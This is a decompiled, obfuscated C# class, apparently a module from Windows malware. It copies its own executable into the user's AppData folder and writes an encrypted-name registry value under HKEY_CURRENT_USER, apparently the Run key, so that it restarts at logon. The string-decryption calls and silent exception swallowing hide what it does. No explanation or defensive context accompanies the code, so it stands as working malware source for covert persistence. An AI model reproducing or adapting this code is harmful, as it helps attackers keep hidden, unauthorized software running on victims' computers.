using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace ns1;

internal class Class10
{
	public class Class11
	{
		public static string string_0 = Class6.smethod_0("hsnU08qkerrcwqDOyt4L", "False");

		public static string string_1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class6.smethod_0("e4eur7COrbSysnuNvr9/lJ6uu2yEsqoq", "False");

		public static void smethod_0()
		{
			int num = 0;
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class6.smethod_0("e4eur7COrbSysnuNvr9/lJ6uu2yEsqoq", "False")))
				{
					File.Copy(Process.GetCurrentProcess().MainModule!.FileName, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class6.smethod_0("e4eur7COrbSysnuNvr9/lJ6uu2yEsqoq", "False"), overwrite: true);
				}
			}
			catch (Exception ex)
			{
				int num2 = default(int);
				ProjectData.SetProjectError(ex, num2);
				ProjectData.ClearProjectError();
			}
			while (true)
			{
				int num2 = 1;
				try
				{
					RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(Class6.smethod_0("c6qswbaBraupjImeuLyyj6G6qZaJqaq8tpOXicKxkqC0wZWFrbm2ro6XmMKtJg==", "False"), writable: true);
					registryKey.SetValue(string_0, string_1);
					registryKey.Close();
					Thread.Sleep(5000);
					try
					{
						Class5.thread_2.Abort();
						break;
					}
					catch (Exception ex2)
					{
						ProjectData.SetProjectError(ex2, num2);
						ProjectData.ClearProjectError();
						break;
					}
				}
				catch (Exception ex3)
				{
					ProjectData.SetProjectError(ex3, num2);
					if (num == 3)
					{
						try
						{
							Class5.thread_2.Abort();
						}
						catch (Exception ex4)
						{
							ProjectData.SetProjectError(ex4, num2);
							ProjectData.ClearProjectError();
						}
						ProjectData.ClearProjectError();
						break;
					}
					num = checked(num + 1);
					ProjectData.ClearProjectError();
				}
			}
		}
	}
}
